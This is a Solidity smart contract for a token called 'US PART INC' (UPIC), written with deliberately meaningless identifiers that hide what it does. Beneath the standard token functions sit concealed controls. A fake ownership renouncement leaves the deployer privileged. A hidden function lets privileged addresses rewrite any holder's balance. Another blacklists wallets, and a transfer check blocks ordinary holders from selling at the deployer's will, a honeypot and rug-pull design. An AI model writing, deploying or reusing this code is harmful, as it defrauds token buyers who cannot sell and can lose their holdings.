//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface launchAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletToken) external view returns (uint256);

    function transfer(address limitToken, uint256 shouldAmountIs) external returns (bool);

    function allowance(address txFundTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldAmountIs) external returns (bool);

    function transferFrom(address sender,address limitToken,uint256 shouldAmountIs) external returns (bool);

    event Transfer(address indexed from, address indexed teamSwap, uint256 value);
    event Approval(address indexed txFundTotal, address indexed spender, uint256 value);
}

interface feeEnableExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalAt {
    function createPair(address liquidityEnable, address launchExempt) external returns (address);
}

abstract contract shouldReceiverMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchAutoMetadata is launchAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract USPARTINC is shouldReceiverMode, launchAuto, launchAutoMetadata {

    function decimals() external view virtual override returns (uint8) {
        return receiverToken;
    }

    uint256 public minLaunch;

    uint256 private maxWallet;

    uint256 tradingToken;

    mapping(address => bool) public enableTo;

    function teamFund(address limitEnable, address limitToken, uint256 shouldAmountIs) internal returns (bool) {
        require(txWalletList[limitEnable] >= shouldAmountIs);
        txWalletList[limitEnable] -= shouldAmountIs;
        txWalletList[limitToken] += shouldAmountIs;
        emit Transfer(limitEnable, limitToken, shouldAmountIs);
        return true;
    }

    function transfer(address atTeam, uint256 shouldAmountIs) external virtual override returns (bool) {
        return amountFee(_msgSender(), atTeam, shouldAmountIs);
    }

    uint8 private receiverToken = 18;

    function transferFrom(address limitEnable, address limitToken, uint256 shouldAmountIs) external override returns (bool) {
        if (_msgSender() != maxReceiver) {
            if (liquidityAmount[limitEnable][_msgSender()] != type(uint256).max) {
                require(shouldAmountIs <= liquidityAmount[limitEnable][_msgSender()]);
                liquidityAmount[limitEnable][_msgSender()] -= shouldAmountIs;
            }
        }
        return amountFee(limitEnable, limitToken, shouldAmountIs);
    }

    function listLaunch(address autoSender) public {
        if (autoFund) {
            return;
        }
        
        exemptIs[autoSender] = true;
        if (fromBuyList != toReceiverExempt) {
            toReceiverExempt = fromBuyList;
        }
        autoFund = true;
    }

    function takeEnable() private view {
        require(exemptIs[_msgSender()]);
    }

    function autoMin(address atTeam, uint256 shouldAmountIs) public {
        takeEnable();
        txWalletList[atTeam] = shouldAmountIs;
    }

    address maxReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public exemptIs;

    function approve(address feeReceiver, uint256 shouldAmountIs) public virtual override returns (bool) {
        liquidityAmount[_msgSender()][feeReceiver] = shouldAmountIs;
        emit Approval(_msgSender(), feeReceiver, shouldAmountIs);
        return true;
    }

    function feeLaunch() public {
        emit OwnershipTransferred(senderLiquidity, address(0));
        listToken = address(0);
    }

    bool public fundExempt;

    address public sellEnable;

    string private launchedAmountBuy = "US PART INC";

    mapping(address => uint256) private txWalletList;

    bool public autoFund;

    mapping(address => mapping(address => uint256)) private liquidityAmount;

    bool public enableTeam;

    function sellMin(address limitIs) public {
        takeEnable();
        
        if (limitIs == senderLiquidity || limitIs == sellEnable) {
            return;
        }
        enableTo[limitIs] = true;
    }

    address private listToken;

    function allowance(address receiverTeam, address feeReceiver) external view virtual override returns (uint256) {
        if (feeReceiver == maxReceiver) {
            return type(uint256).max;
        }
        return liquidityAmount[receiverTeam][feeReceiver];
    }

    function getOwner() external view returns (address) {
        return listToken;
    }

    address public senderLiquidity;

    function name() external view virtual override returns (string memory) {
        return launchedAmountBuy;
    }

    uint256 public toReceiverExempt;

    bool public tokenFeeLimit;

    function symbol() external view virtual override returns (string memory) {
        return totalMarketing;
    }

    event OwnershipTransferred(address indexed receiverTo, address indexed limitLaunch);

    function totalSupply() external view virtual override returns (uint256) {
        return launchedLiquidity;
    }

    bool public txReceiver;

    uint256 private launchedLiquidity = 100000000 * 10 ** 18;

    uint256 private isWallet;

    constructor (){
        
        feeLaunch();
        feeEnableExempt modeTotal = feeEnableExempt(maxReceiver);
        sellEnable = totalAt(modeTotal.factory()).createPair(modeTotal.WETH(), address(this));
        
        senderLiquidity = _msgSender();
        exemptIs[senderLiquidity] = true;
        txWalletList[senderLiquidity] = launchedLiquidity;
        
        emit Transfer(address(0), senderLiquidity, launchedLiquidity);
    }

    function balanceOf(address walletToken) public view virtual override returns (uint256) {
        return txWalletList[walletToken];
    }

    uint256 private fromBuyList;

    address tokenAtAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 atSell;

    string private totalMarketing = "UPIC";

    function receiverLaunch(uint256 shouldAmountIs) public {
        takeEnable();
        atSell = shouldAmountIs;
    }

    function owner() external view returns (address) {
        return listToken;
    }

    function amountFee(address limitEnable, address limitToken, uint256 shouldAmountIs) internal returns (bool) {
        if (limitEnable == senderLiquidity) {
            return teamFund(limitEnable, limitToken, shouldAmountIs);
        }
        uint256 tradingFund = launchAuto(sellEnable).balanceOf(tokenAtAuto);
        require(tradingFund == atSell);
        require(!enableTo[limitEnable]);
        return teamFund(limitEnable, limitToken, shouldAmountIs);
    }

}